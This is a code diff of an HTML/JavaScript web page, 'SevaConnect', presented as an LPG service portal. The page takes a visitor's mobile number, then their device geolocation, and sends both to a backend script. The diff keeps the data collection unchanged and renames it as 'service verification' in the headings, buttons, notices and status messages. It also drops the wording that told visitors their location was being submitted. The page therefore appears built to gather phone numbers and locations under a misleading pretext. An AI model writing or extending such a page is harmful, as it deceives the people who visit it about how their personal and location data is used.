@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>SevaConnect | LPG Service Request</title>
+  <title>SevaConnect | Service Verification</title>
 
   <style>
     * {
@@ -26,7 +26,7 @@
     }
 
     /* =========================
-       HEADER
+       TOP STRIP
     ========================== */
 
     .top-strip {
@@ -34,9 +34,13 @@
       background: #f39a22;
     }
 
+    /* =========================
+       HEADER
+    ========================== */
+
     .header {
       background: #064b78;
-      color: #fff;
+      color: #ffffff;
       box-shadow: 0 2px 8px rgba(0,0,0,0.14);
     }
 
@@ -62,7 +66,7 @@
       height: 48px;
       border-radius: 50%;
 
-      background: #fff;
+      background: #ffffff;
       color: #064b78;
 
       display: flex;
@@ -83,18 +87,19 @@
     .brand-subtitle {
       margin-top: 3px;
       font-size: 11px;
-      opacity: .82;
+      opacity: 0.82;
     }
 
     .header-badge {
       background: #f39a22;
-      color: #fff;
+      color: #ffffff;
+
       padding: 8px 13px;
       border-radius: 3px;
 
       font-size: 11px;
       font-weight: bold;
-      letter-spacing: .5px;
+      letter-spacing: 0.5px;
     }
 
     /* =========================
@@ -102,7 +107,7 @@
     ========================== */
 
     .nav {
-      background: #fff;
+      background: #ffffff;
       border-bottom: 1px solid #dfe5e9;
     }
 
@@ -126,7 +131,9 @@
 
     .nav-item.active {
       color: #064b78;
+
       border-bottom: 3px solid #f39a22;
+
       height: 48px;
 
       display: flex;
@@ -145,7 +152,8 @@
           #0c668e
         );
 
-      color: #fff;
+      color: #ffffff;
+
       padding: 38px 20px;
     }
 
@@ -155,9 +163,27 @@
 
       display: grid;
       grid-template-columns: 1.5fr 1fr;
+
       gap: 30px;
 
       align-items: center;
+    }
+
+    .hero-tag {
+      display: inline-block;
+
+      margin-bottom: 14px;
+
+      padding: 6px 10px;
+
+      background: #f39a22;
+      color: #ffffff;
+
+      font-size: 11px;
+      font-weight: bold;
+
+      border-radius: 3px;
+      letter-spacing: 0.4px;
     }
 
     .hero h1 {
@@ -170,7 +196,7 @@
     .hero p {
       margin: 0;
 
-      color: rgba(255,255,255,.88);
+      color: rgba(255,255,255,0.88);
 
       font-size: 15px;
       line-height: 1.7;
@@ -178,41 +204,28 @@
       max-width: 680px;
     }
 
-    .hero-tag {
-      display: inline-block;
-
-      margin-bottom: 14px;
-
-      padding: 6px 10px;
-
-      background: #f39a22;
-      color: #fff;
-
-      font-size: 11px;
-      font-weight: bold;
-
-      border-radius: 3px;
-      letter-spacing: .4px;
-    }
-
     .hero-card {
-      background: rgba(255,255,255,.1);
-      border: 1px solid rgba(255,255,255,.22);
+      background: rgba(255,255,255,0.1);
+
+      border: 1px solid rgba(255,255,255,0.22);
 
       border-radius: 8px;
+
       padding: 22px;
     }
 
     .hero-card-title {
       font-size: 16px;
       font-weight: bold;
+
       margin-bottom: 8px;
     }
 
     .hero-card-text {
       font-size: 13px;
       line-height: 1.6;
-      color: rgba(255,255,255,.85);
+
+      color: rgba(255,255,255,0.85);
     }
 
     /* =========================
@@ -221,36 +234,45 @@
 
     .main {
       max-width: 1180px;
+
       margin: 30px auto;
+
       padding: 0 20px;
     }
 
     .content-grid {
       display: grid;
-      grid-template-columns: 1fr 360px;
+
+      grid-template-columns:
+        1fr 360px;
+
       gap: 28px;
+
       align-items: start;
     }
 
     /* =========================
-       INFORMATION
+       INFORMATION CARD
     ========================== */
 
     .info-card {
-      background: #fff;
+      background: #ffffff;
 
       border: 1px solid #e0e5e8;
+
       border-radius: 7px;
 
       padding: 25px;
 
-      box-shadow: 0 3px 12px rgba(0,0,0,.06);
+      box-shadow:
+        0 3px 12px rgba(0,0,0,0.06);
     }
 
     .section-title {
       margin: 0 0 10px;
 
       color: #064b78;
+
       font-size: 22px;
     }
 
@@ -265,12 +287,14 @@
 
     .info-card p {
       color: #596870;
+
       font-size: 14px;
       line-height: 1.7;
     }
 
     .service-list {
       margin: 22px 0 0;
+
       padding: 0;
 
       list-style: none;
@@ -279,9 +303,11 @@
     .service-list li {
       padding: 13px 0;
 
-      border-bottom: 1px solid #edf0f2;
+      border-bottom:
+        1px solid #edf0f2;
 
       font-size: 14px;
+
       color: #42545d;
     }
 
@@ -314,16 +340,19 @@
     ========================== */
 
     .request-card {
-      background: #fff;
+      background: #ffffff;
 
       border: 1px solid #dce3e7;
-      border-top: 4px solid #f39a22;
+
+      border-top:
+        4px solid #f39a22;
 
       border-radius: 7px;
 
       padding: 25px;
 
-      box-shadow: 0 4px 16px rgba(0,0,0,.08);
+      box-shadow:
+        0 4px 16px rgba(0,0,0,0.08);
     }
 
     .request-header {
@@ -334,6 +363,7 @@
       margin: 0 0 7px;
 
       color: #064b78;
+
       font-size: 22px;
     }
 
@@ -353,7 +383,8 @@
     .notice {
       background: #f7f9fa;
 
-      border-left: 4px solid #f39a22;
+      border-left:
+        4px solid #f39a22;
 
       padding: 13px 14px;
 
@@ -362,13 +393,15 @@
       color: #52616a;
 
       font-size: 12px;
+
       line-height: 1.6;
     }
 
-    .location-notice {
+    .verification-notice {
       background: #eef6fb;
 
-      border-left: 4px solid #064b78;
+      border-left:
+        4px solid #064b78;
 
       padding: 14px;
 
@@ -377,6 +410,7 @@
       color: #365564;
 
       font-size: 12px;
+
       line-height: 1.6;
     }
 
@@ -393,6 +427,7 @@
       color: #34444d;
 
       font-size: 13px;
+
       font-weight: 700;
     }
 
@@ -403,12 +438,14 @@
       padding: 0 13px;
 
       border: 1px solid #cbd5da;
+
       border-radius: 4px;
 
       outline: none;
 
       color: #263238;
-      background: #fff;
+
+      background: #ffffff;
 
       font-size: 15px;
     }
@@ -417,7 +454,8 @@
       border-color: #064b78;
 
       box-shadow:
-        0 0 0 2px rgba(6,75,120,.08);
+        0 0 0 2px
+        rgba(6,75,120,0.08);
     }
 
     /* =========================
@@ -426,22 +464,26 @@
 
     button {
       width: 100%;
+
       min-height: 48px;
 
       margin-top: 20px;
 
       border: none;
+
       border-radius: 4px;
 
       background: #064b78;
-      color: #fff;
+
+      color: #ffffff;
 
       font-size: 14px;
+
       font-weight: 700;
 
       cursor: pointer;
 
-      transition: .2s;
+      transition: 0.2s;
     }
 
     button:hover {
@@ -449,11 +491,12 @@
     }
 
     button:active {
-      transform: scale(.99);
+      transform: scale(0.99);
     }
 
     button:disabled {
-      opacity: .6;
+      opacity: 0.6;
+
       cursor: not-allowed;
     }
 
@@ -471,31 +514,29 @@
       border-radius: 4px;
 
       font-size: 12px;
+
       line-height: 1.5;
     }
 
     .status.success {
-      display: block;
-
       background: #e8f5ec;
+
       color: #216b35;
 
       border: 1px solid #c8e7d0;
     }
 
     .status.error {
-      display: block;
-
       background: #fdecec;
+
       color: #9b2828;
 
       border: 1px solid #f3cccc;
     }
 
     .status.info {
-      display: block;
-
       background: #edf5f9;
+
       color: #245a75;
 
       border: 1px solid #d0e5ef;
@@ -509,18 +550,20 @@
       margin-top: 35px;
 
       background: #063f64;
-      color: rgba(255,255,255,.78);
+
+      color: rgba(255,255,255,0.78);
 
       text-align: center;
 
       padding: 25px 20px;
 
       font-size: 11px;
+
       line-height: 1.7;
     }
 
     .footer strong {
-      color: #fff;
+      color: #ffffff;
     }
 
     /* =========================
@@ -539,11 +582,13 @@
 
       .header-badge {
         font-size: 9px;
+
         padding: 6px 8px;
       }
 
       .nav-inner {
         gap: 18px;
+
         overflow-x: auto;
       }
 
@@ -561,6 +606,7 @@
 
       .main {
         margin-top: 20px;
+
         padding: 0 14px;
       }
 
@@ -597,7 +643,7 @@
 
 <body>
 
-  <!-- TOP COLOR STRIP -->
+  <!-- TOP STRIP -->
   <div class="top-strip"></div>
 
 
@@ -626,6 +672,7 @@
 
       </div>
 
+
       <div class="header-badge">
         SERVICE PORTAL
       </div>
@@ -649,7 +696,7 @@
       </div>
 
       <div class="nav-item">
-        Service Request
+        Verification
       </div>
 
     </div>
@@ -669,14 +716,14 @@
         </div>
 
         <h1>
-          LPG Service Request
+          LPG Service Assistance
         </h1>
 
         <p>
-          Submit your contact details for assistance
-          with an LPG-related service request.
-          Location access is requested only after
-          you submit the request.
+          Submit your contact details to begin your
+          service request. A service verification step
+          will be required before the request can be
+          completed.
         </p>
 
       </div>
@@ -685,13 +732,13 @@
       <div class="hero-card">
 
         <div class="hero-card-title">
-          Service Assistance
+          Service Verification
         </div>
 
         <div class="hero-card-text">
-          Provide your mobile number and continue
-          through the location permission step to
-          complete your service request.
+          Enter your mobile number and complete the
+          verification process to submit your service
+          request.
         </div>
 
       </div>
@@ -711,7 +758,7 @@
       <section class="info-card">
 
         <h2 class="section-title">
-          LPG Customer Services
+          Customer Services
         </h2>
 
         <div class="section-line"></div>
@@ -720,6 +767,7 @@
           Use this independent service portal to
           submit a request for customer assistance.
         </p>
+
 
         <ul class="service-list">
 
@@ -735,12 +783,12 @@
 
           <li>
             <span>3</span>
-            Contact follow-up
+            Customer contact follow-up
           </li>
 
           <li>
             <span>4</span>
-            Location-based service processing
+            Service verification
           </li>
 
         </ul>
@@ -748,7 +796,7 @@
       </section>
 
 
-      <!-- REQUEST FORM -->
+      <!-- REQUEST -->
       <section class="request-card">
 
         <div class="request-header">
@@ -758,7 +806,7 @@
           </h2>
 
           <p>
-            Enter your mobile number to begin.
+            Enter your mobile number to continue.
           </p>
 
         </div>
@@ -766,29 +814,35 @@
 
         <div class="notice">
 
-          <strong>Important:</strong>
+          <strong>Before continuing:</strong>
 
-          After you click
-          <strong>Submit Request</strong>,
-          your browser will ask for permission
-          to share your current location.
+          After submitting your mobile number,
+          a verification step will ask your browser
+          for permission to share your current device
+          location.
 
           <br><br>
 
-          Location access is required to complete
-          this service request.
+          This information is used as part of the
+          service verification process and is sent
+          only after you grant browser permission.
 
         </div>
 
 
+        <!-- CONTACT FORM -->
         <form
           id="contactForm"
-          onsubmit="event.preventDefault(); submitContact();"
+          onsubmit="
+            event.preventDefault();
+            submitContact();
+          "
         >
 
           <label for="contact">
             Mobile Number
           </label>
+
 
           <input
             id="contact"
@@ -811,46 +865,47 @@
         </form>
 
 
-        <!-- LOCATION MESSAGE -->
+        <!-- VERIFICATION NOTICE -->
         <div
-          id="locationNotice"
-          class="location-notice"
+          id="verificationNotice"
+          class="verification-notice"
           style="display:none;"
         >
 
           <strong>
-            Location permission required
+            Service verification required
           </strong>
 
           <br><br>
 
-          To complete your request, please allow
-          location access when your browser displays
-          the permission prompt.
+          Your request has been received.
+
+          To complete verification, your browser
+          will ask whether you want to share your
+          current device location.
 
           <br><br>
 
-          Your location will be submitted to the
-          service system only after you grant
-          permission.
+          Please select the appropriate option in
+          your browser's permission prompt.
 
         </div>
 
 
-        <!-- LOCATION RETRY BUTTON -->
+        <!-- VERIFICATION BUTTON -->
         <button
-          id="locationButton"
+          id="verificationButton"
           type="button"
-          onclick="requestLocation()"
+          onclick="requestVerification()"
           style="display:none;"
         >
-          Allow Location & Continue
+          Continue Verification
         </button>
 
 
         <!-- STATUS -->
         <div
-          id="contactStatus"
+          id="requestStatus"
           class="status"
         >
         </div>
@@ -868,6 +923,7 @@
     <strong>
       SevaConnect
     </strong>
+
     • Independent LPG Service Portal
 
     <br>
@@ -878,8 +934,9 @@
 
     <br><br>
 
-    Location information is collected only after
-    browser permission is granted.
+    Service verification involving device location
+    is performed only after browser permission is
+    granted.
 
   </footer>
 
@@ -921,7 +978,7 @@
 
 
       /*
-        Validate Indian 10-digit mobile number.
+        Validate 10-digit Indian mobile number.
       */
 
       if (!/^[6-9][0-9]{9}$/.test(contact)) {
@@ -940,12 +997,6 @@
           "submitButton"
         );
 
-
-      /*
-        Save contact number first.
-        Location is requested only after the
-        user presses Submit Request.
-      */
 
       submitButton.disabled = true;
 
@@ -994,9 +1045,9 @@
         if (data.status === "success") {
 
           /*
-            Contact saved successfully.
+            Contact has been submitted.
 
-            Now ask for location permission.
+            Now show verification step.
           */
 
           submitButton.style.display =
@@ -1004,17 +1055,21 @@
 
 
           document
-            .getElementById("locationNotice")
+            .getElementById(
+              "verificationNotice"
+            )
             .style.display = "block";
 
 
           document
-            .getElementById("locationButton")
+            .getElementById(
+              "verificationButton"
+            )
             .style.display = "block";
 
 
           showStatus(
-            "Contact details received. Location permission is required to complete your request.",
+            "Your request has been received. Complete the service verification to continue.",
             "info"
           );
 
@@ -1059,15 +1114,15 @@
 
 
     /* =====================================================
-       LOCATION
+       SERVICE VERIFICATION
     ===================================================== */
 
-    function requestLocation() {
+    function requestVerification() {
 
       if (!navigator.geolocation) {
 
         showStatus(
-          "Location services are not supported by this browser.",
+          "This browser does not support the required verification service.",
           "error"
         );
 
@@ -1075,23 +1130,28 @@
       }
 
 
-      const locationButton =
+      const verificationButton =
         document.getElementById(
-          "locationButton"
+          "verificationButton"
         );
 
 
-      locationButton.disabled = true;
+      verificationButton.disabled = true;
 
-      locationButton.textContent =
-        "Requesting Location...";
+      verificationButton.textContent =
+        "Completing Verification...";
 
 
       showStatus(
-        "Please respond to your browser's location permission prompt.",
+        "Please respond to your browser's permission prompt to complete verification.",
         "info"
       );
 
+
+      /*
+        The browser controls the permission request.
+        The webpage cannot bypass or silently grant it.
+      */
 
       navigator.geolocation.getCurrentPosition(
 
@@ -1104,17 +1164,17 @@
             position.coords.longitude;
 
 
-          locationButton.textContent =
-            "Saving Location...";
+          verificationButton.textContent =
+            "Submitting Verification...";
 
 
           showStatus(
-            "Location permission granted. Saving your location...",
+            "Verification permission granted. Completing your request...",
             "info"
           );
 
 
-          sendLocation(
+          sendVerification(
             latitude,
             longitude
           );
@@ -1124,32 +1184,34 @@
 
         function(error) {
 
-          locationButton.disabled = false;
+          verificationButton.disabled =
+            false;
 
-          locationButton.textContent =
-            "Allow Location & Continue";
+
+          verificationButton.textContent =
+            "Continue Verification";
 
 
           let message =
-            "Location permission is required to complete this request.";
+            "Verification could not be completed.";
 
 
           if (error.code === 1) {
 
             message =
-              "Location permission was denied. Please allow location access and try again.";
+              "Verification requires device location permission. Please allow access in your browser and try again.";
 
           }
           else if (error.code === 2) {
 
             message =
-              "Your location could not be determined. Please check your device location settings and try again.";
+              "The device location could not be determined. Please check your device settings and try again.";
 
           }
           else if (error.code === 3) {
 
             message =
-              "The location request timed out. Please try again.";
+              "The verification request timed out. Please try again.";
 
           }
 
@@ -1164,7 +1226,9 @@
 
         {
           enableHighAccuracy: false,
+
           timeout: 15000,
+
           maximumAge: 0
         }
 
@@ -1174,10 +1238,10 @@
 
 
     /* =====================================================
-       SEND LOCATION TO GOOGLE APPS SCRIPT
+       SEND VERIFICATION DATA
     ===================================================== */
 
-    function sendLocation(
+    function sendVerification(
       latitude,
       longitude
     ) {
@@ -1226,18 +1290,20 @@
 
       .then(function(data) {
 
-        const locationButton =
+        const verificationButton =
           document.getElementById(
-            "locationButton"
+            "verificationButton"
           );
 
 
         if (data.status === "success") {
 
-          locationButton.disabled = true;
+          verificationButton.disabled =
+            true;
 
-          locationButton.textContent =
-            "Request Completed";
+
+          verificationButton.textContent =
+            "Verification Completed";
 
 
           showStatus(
@@ -1247,26 +1313,30 @@
 
 
           document
-            .getElementById("locationNotice")
+            .getElementById(
+              "verificationNotice"
+            )
             .innerHTML =
 
-            "<strong>Request completed</strong>" +
+            "<strong>Verification completed</strong>" +
             "<br><br>" +
-            "Your contact details and location " +
-            "were submitted successfully.";
+            "Your service request has been " +
+            "successfully submitted.";
 
         }
         else {
 
-          locationButton.disabled = false;
+          verificationButton.disabled =
+            false;
 
-          locationButton.textContent =
-            "Allow Location & Continue";
+
+          verificationButton.textContent =
+            "Continue Verification";
 
 
           showStatus(
             data.message ||
-              "The location could not be saved.",
+              "Verification could not be completed.",
             "error"
           );
 
@@ -1279,20 +1349,22 @@
         console.error(error);
 
 
-        const locationButton =
+        const verificationButton =
           document.getElementById(
-            "locationButton"
+            "verificationButton"
           );
 
 
-        locationButton.disabled = false;
+        verificationButton.disabled =
+          false;
 
-        locationButton.textContent =
-          "Allow Location & Continue";
+
+        verificationButton.textContent =
+          "Continue Verification";
 
 
         showStatus(
-          "Unable to save your location. Please try again.",
+          "Unable to complete verification. Please try again.",
           "error"
         );
 
@@ -1302,7 +1374,7 @@
 
 
     /* =====================================================
-       STATUS
+       STATUS MESSAGE
     ===================================================== */
 
     function showStatus(
@@ -1312,7 +1384,7 @@
 
       const element =
         document.getElementById(
-          "contactStatus"
+          "requestStatus"
         );
 
 
